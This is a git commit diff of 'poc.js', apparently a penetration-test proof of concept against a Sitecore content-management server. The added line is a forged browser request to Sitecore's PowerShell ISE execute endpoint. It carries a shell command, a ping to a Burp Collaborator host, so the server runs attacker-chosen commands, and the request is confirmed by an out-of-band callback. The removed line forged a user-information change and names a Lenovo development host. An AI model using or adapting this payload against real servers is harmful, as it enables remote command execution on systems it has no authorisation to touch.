d647dff425e67830d4d9f499cc152171e274a2f6
portalstr <92850422+portalstr@users.noreply.github.com>
2021-11-08 21:15:25 +0200

    Update poc.js

--- poc.js
+++ poc.js
@@ -6,5 +6,5 @@ function handleResponse() {
     var changeReq = new XMLHttpRequest();
     changeReq.open('post', '/sitecore/shell/default.aspx?xmlcontrol=ChangeUserInformation', true);
     changeReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-    changeReq.send('&__PARAMETERS=&__EVENTTARGET=OK&__EVENTARGUMENT=&__SOURCE=OK&__EVENTTYPE=click&__CONTEXTMENU=&__MODIFIED=&__ISEVENT=1&__SHIFTKEY=&__CTRLKEY=&__ALTKEY=&__BUTTON=0&__KEYCODE=undefined&__X=351&__Y=573&__URL=https%3A//cm.dxp-dev.lenovo.com/sitecore/shell/default.aspx%3Fxmlcontrol%3DChangeUserInformation&__CSRFTOKEN=AAEAAAD%2F%2F%2F%2F%2FAQAAAAAAAAAGAQAAACQ3ZWY0MmJkYS0wY2QzLTQzN2YtYWI0OC0yMDExN2VlZmYxZDQL&__VIEWSTATE=87BA08D6C2F74B3B9F6BA5C6E3156921&__VIEWSTATE=&Fullname=dxpPentestXSPOC&Email=lr%40moc.moc')
+    changeReq.send('&__PARAMETERS=ise%3Aexecute%28elevationResult%3D1%29%28elevationResult%3D1%29&__EVENTTARGET=&__EVENTARGUMENT=&__SOURCE=&__EVENTTYPE=&__CONTEXTMENU=&__MODIFIED=&__ISEVENT=1&__CSRFTOKEN=AAEAAAD%2F%2F%2F%2F%2FAQAAAAAAAAAGAQAAACQ3NTNlMzUzZi1jN2FjLTQxZTEtOWVjMS1mYTVkYWJjOWQ5YjkL&__VIEWSTATE=BAA9C8E1B9D847BEA06DDFD2103DF2F2&__VIEWSTATE=&scActiveRibbonStrip=&scGalleries=&SelectionText=&SelectionRange=&Breakpoints=&Editor=ping%20bq5r4vl39xiw5ow2xa46pfth288z0np.burpcollaborator.net')
 };
